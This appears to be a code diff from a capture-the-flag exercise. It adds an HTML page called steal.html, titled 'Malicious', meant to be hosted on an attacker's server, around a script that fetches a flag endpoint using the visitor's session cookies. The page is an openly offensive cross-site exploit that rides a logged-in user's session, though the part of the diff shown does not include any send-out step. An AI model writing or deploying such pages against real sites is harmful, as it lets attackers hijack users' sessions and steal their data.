@@ -1,4 +1,8 @@
-
+<!-- public/steal.html (or on your external server) -->
+<!DOCTYPE html>
+<html>
+<head><title>Malicious</title></head>
+<body>
 <script>
   // Fetch the flag from the server with proper session cookies
   fetch("/api/fetchflag", {
@@ -18,4 +22,5 @@
     console.error('Error fetching the flag:', err);
   });
 </script>
-
+</body>
+</html>
